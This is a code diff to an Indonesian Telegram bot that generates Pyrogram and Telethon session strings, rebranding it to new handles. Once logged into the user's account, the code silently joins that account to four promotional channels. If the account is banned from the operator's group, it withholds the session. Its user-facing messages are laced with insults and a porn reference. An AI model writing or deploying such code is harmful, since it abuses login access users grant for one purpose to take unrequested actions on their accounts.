@@ -5,6 +5,12 @@ from pyrogram import Client, filters
 from asyncio.exceptions import TimeoutError
 from telethon.sessions import StringSession
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from telethon.errors import rpcerrorlist
+from pyrogram.errors import UserBannedInChannel
+import telethon
+import pyrogram
+from telethon.tl.functions.channels import JoinChannelRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest
 from pyrogram.errors import (
     ApiIdInvalid,
     PhoneNumberInvalid,
@@ -26,7 +32,7 @@ from env import API_ID, API_HASH
 from data import Data
 
 
-ask_ques = "<b>Silakan Pilih Ya Anjeng Lu Mo Buat Apa\n\nSesuaikan Ya Anjeng, Kalo Ada Kata `Bot` Berarti Itu Masukin Bot Token Ya Anjeng Bukan Nomor Akun Telegram Lu !</b>"
+ask_ques = "<b>Silakan Pilih Ya Anjeng Lu Mo Buat Apa\n\nSesuaikan Ya Anjeng, Pyrogram V2 atau Telethon</b>"
 buttons_ques = [
     [
         InlineKeyboardButton("Pyrogram V2", callback_data="pyrogram"),
@@ -35,6 +41,16 @@ buttons_ques = [
 
 ]
 
+admin_kynan = [
+    [
+      InlineKeyboardButton(text="👮‍♂ Kazu", user_id=5063062493),
+      InlineKeyboardButton(text="👮‍♂ Kynan", user_id=1054295664),
+    ],
+    [
+      InlineKeyboardButton(text="👮‍♂ Jhor", user_id=1755047203),
+      InlineKeyboardButton(text="👮‍♂ Omnya", user_id=1810243126),
+    ],
+  ]
 
 @Client.on_message(filters.private & ~filters.forwarded & filters.command('generate'))
 async def main(_, msg):
@@ -148,18 +164,22 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
         string_session = client.session.save()
     else:
         string_session = await client.export_session_string()
-    text = f"**{ty.upper()} NIH JING.** \n\n`{string_session}` \n\n**Minimal Bilang Makasih Ke** @Rizzvbss **Atau Ke** @KynanSupport **Karna Akun Lu Kaga Deak**"
+    text = f"**{ty.upper()} NIH JING.** \n\n`{string_session}` \n\n**Minimal Bilang Makasih Ke** @disinikazu **Atau Ke** @kazusupportgrp **Karna Akun Lu Kaga Deak**"
     try:
-        if telethon:
-            await client(JoinChannelRequest("@kynansupport"))
-            await client(JoinChannelRequest("@carimutualanid"))
-            await client(JoinChannelRequest("@kontenfilm"))
-            await client(JoinChannelRequest("@abtnaaa"))
-        else:
-            await client.join_chat("kynansupport")
-            await client.join_chat("carimutualanid")
-            await client.join_chat("kontenfilm")
-            await client.join_chat("abtnaaa")
+        try:
+            if telethon:
+                await client(JoinChannelRequest("kazusupportgrp"))
+                await client(JoinChannelRequest("veaperas1k"))
+                await client(JoinChannelRequest("Html12text"))
+                await client(JoinChannelRequest("mutuovertime"))
+            else:
+                await client.join_chat("kazusupportgrp")
+                await client.join_chat("veaperas1k")
+                await client.join_chat("Html12text")
+                await client.join_chat("mutuovertime")
+        except (rpcerrorlist.ChannelPrivateError, UserBannedInChannel):
+            await msg.reply('**Jiah akun lu dibanned di Kazu Support.\nCoba sono ngadu ke salah 1 admin Kazu Support biar dibuka ban nya.**', quote=True, reply_markup=InlineKeyboardMarkup(admin_kynan))
+            return
         if not is_bot:
             await client.send_message("me", text)
         else:
@@ -168,7 +188,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
         pass
     await client.disconnect()
     await asyncio.sleep(1.0)
-    await bot.send_message(msg.chat.id, " {} **Dah Jadi Ya Bangsat.** \n\n**Cek Pesan Tersimpan Lu Yang Banyak Bokep Nya!** \n\n**Minimal Bilang Makasih Ke** @Rizzvbss **Atau Ke** @KynanSupport **Karna Akun Lu Kaga Deak**".format("Telethon" if telethon else "Pyrogram"))
+    await bot.send_message(msg.chat.id, " {} **Dah Jadi Ya Bangsat.** \n\n**Cek Pesan Tersimpan Lu Yang Banyak Bokep Nya!** \n\n**Minimal Bilang Makasih Ke** @disinikazu **Atau Ke** @kazusupportgrp **Karna Akun Lu Kaga Deak**".format("Telethon" if telethon else "Pyrogram"))
 
 
 async def cancelled(msg):
